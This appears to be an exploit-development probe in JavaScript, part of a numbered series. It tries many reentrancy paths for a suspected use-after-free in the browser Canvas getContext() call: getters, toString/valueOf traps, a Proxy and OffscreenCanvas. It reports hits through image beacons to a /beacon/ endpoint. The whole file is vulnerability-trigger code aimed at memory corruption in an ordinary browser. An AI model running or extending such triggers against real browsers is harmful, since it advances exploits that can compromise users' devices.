// CRASH_CLASS: MODERATE
// PROBE p551: Canvas getContext() UAF — trigger variant sweep
//
// p550 showed getter=0 on 14.10: the alpha getter never fired.
// This probe tries every plausible reentrancy path:
//   A) 2d context: alpha, willReadFrequently, desynchronized, colorSpace
//   B) webgl context: alpha, antialias, depth, stencil, premultipliedAlpha
//   C) webgl2 context: same as B
//   D) Multi-getter (all properties with getters at once)
//   E) Nested getContext inside toString/valueOf of a property
//
// For each: does the getter fire? Does reentrancy produce two contexts?

document.write('<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P551-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(msg.slice(0, 300));
    } catch (e) {}
  }

  emit('START', 'ua=' + navigator.userAgent.slice(0, 80));

  // --- Helper: test one getter-based trigger ---
  function testGetter(ctxType, propName, propValue, label) {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    retained.push(c);

    var getterFired = 0;
    var inner = null;
    var opts = {};

    Object.defineProperty(opts, propName, {
      get: function () {
        getterFired++;
        if (getterFired === 1) {
          inner = c.getContext(ctxType);
        }
        return propValue;
      },
      enumerable: true
    });

    var outer = null;
    try {
      outer = c.getContext(ctxType, opts);
    } catch (e) {
      emit(label, 'THREW ' + e);
      return null;
    }

    retained.push(outer, inner);

    var current = c.getContext(ctxType);
    retained.push(current);

    var result = {
      getter: getterFired,
      inner: !!inner,
      outer: !!outer,
      same: outer === inner,
      uaf: outer !== inner && !!inner && !!outer
    };

    emit(label, 'getter=' + result.getter +
      ' inner=' + result.inner +
      ' outer=' + result.outer +
      ' same=' + result.same +
      ' uaf=' + result.uaf);

    return result;
  }

  // --- A) 2D context variants ---
  var props2d = [
    ['alpha', true],
    ['willReadFrequently', true],
    ['desynchronized', false],
    ['colorSpace', 'srgb']
  ];

  for (var i = 0; i < props2d.length; i++) {
    testGetter('2d', props2d[i][0], props2d[i][1], '2D-' + props2d[i][0]);
  }

  // --- B) WebGL context variants ---
  var propsGL = [
    ['alpha', true],
    ['antialias', true],
    ['depth', true],
    ['stencil', false],
    ['premultipliedAlpha', true],
    ['preserveDrawingBuffer', false],
    ['failIfMajorPerformanceCaveat', false],
    ['powerPreference', 'default'],
    ['desynchronized', false]
  ];

  for (var j = 0; j < propsGL.length; j++) {
    testGetter('webgl', propsGL[j][0], propsGL[j][1], 'GL-' + propsGL[j][0]);
  }

  // --- C) WebGL2 context ---
  testGetter('webgl2', 'alpha', true, 'GL2-alpha');
  testGetter('webgl2', 'antialias', true, 'GL2-antialias');

  // --- D) Multi-getter: all 2d props have getters at once ---
  (function () {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    retained.push(c);

    var fires = {};
    var inner = null;
    var opts = {};
    var allProps = ['alpha', 'willReadFrequently', 'desynchronized'];

    for (var k = 0; k < allProps.length; k++) {
      (function (name) {
        fires[name] = 0;
        Object.defineProperty(opts, name, {
          get: function () {
            fires[name]++;
            if (!inner) { inner = c.getContext('2d'); }
            return true;
          },
          enumerable: true
        });
      })(allProps[k]);
    }

    var outer = null;
    try { outer = c.getContext('2d', opts); } catch (e) { emit('MULTI', 'THREW ' + e); }

    retained.push(outer, inner);
    var parts = [];
    for (var m = 0; m < allProps.length; m++) {
      parts.push(allProps[m] + '=' + fires[allProps[m]]);
    }
    emit('MULTI-2D', parts.join(' ') +
      ' inner=' + !!inner +
      ' outer=' + !!outer +
      ' uaf=' + (outer !== inner && !!inner && !!outer));
  })();

  // --- E) toString/valueOf trap on a property value ---
  (function () {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    retained.push(c);

    var inner = null;
    var trap = {
      toString: function () {
        if (!inner) { inner = c.getContext('2d'); }
        return 'srgb';
      }
    };

    var outer = null;
    try { outer = c.getContext('2d', { colorSpace: trap }); } catch (e) {
      emit('TOSTR-colorSpace', 'THREW ' + e);
    }

    retained.push(outer, inner);
    emit('TOSTR-colorSpace', 'inner=' + !!inner +
      ' outer=' + !!outer +
      ' uaf=' + (outer !== inner && !!inner && !!outer));
  })();

  // --- F) valueOf trap on alpha ---
  (function () {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    retained.push(c);

    var inner = null;
    var trap = {
      valueOf: function () {
        if (!inner) { inner = c.getContext('2d'); }
        return true;
      }
    };

    var outer = null;
    try { outer = c.getContext('2d', { alpha: trap }); } catch (e) {
      emit('VALOF-alpha', 'THREW ' + e);
    }

    retained.push(outer, inner);
    emit('VALOF-alpha', 'inner=' + !!inner +
      ' outer=' + !!outer +
      ' uaf=' + (outer !== inner && !!inner && !!outer));
  })();

  // --- G) Proxy-based options object ---
  (function () {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    retained.push(c);

    var inner = null;
    var accessLog = [];

    try {
      var handler = {
        get: function (target, prop) {
          accessLog.push(prop);
          if (prop === 'alpha' && !inner) {
            inner = c.getContext('2d');
          }
          return target[prop];
        }
      };
      var opts = new Proxy({ alpha: true }, handler);

      var outer = null;
      try { outer = c.getContext('2d', opts); } catch (e) {
        emit('PROXY-2D', 'THREW ' + e);
      }

      retained.push(outer, inner);
      emit('PROXY-2D', 'accessed=[' + accessLog.join(',') + ']' +
        ' inner=' + !!inner +
        ' outer=' + !!outer +
        ' uaf=' + (outer !== inner && !!inner && !!outer));
    } catch (e) {
      emit('PROXY-2D', 'NO-PROXY ' + e);
    }
  })();

  // --- H) getContext on OffscreenCanvas (if available) ---
  (function () {
    if (typeof OffscreenCanvas === 'undefined') {
      emit('OFFSCREEN', 'not available');
      return;
    }
    try {
      var oc = new OffscreenCanvas(1, 1);
      retained.push(oc);

      var inner = null;
      var getterFired = 0;
      var opts = {};
      Object.defineProperty(opts, 'alpha', {
        get: function () {
          getterFired++;
          if (getterFired === 1) { inner = oc.getContext('2d'); }
          return true;
        },
        enumerable: true
      });

      var outer = null;
      try { outer = oc.getContext('2d', opts); } catch (e) {
        emit('OFFSCREEN-2D', 'THREW ' + e);
        return;
      }

      retained.push(outer, inner);
      emit('OFFSCREEN-2D', 'getter=' + getterFired +
        ' inner=' + !!inner +
        ' outer=' + !!outer +
        ' uaf=' + (outer !== inner && !!inner && !!outer));
    } catch (e) {
      emit('OFFSCREEN', 'ERR ' + e);
    }
  })();

  emit('DONE', 'all variants tested');
  window.__p551 = retained;
})();
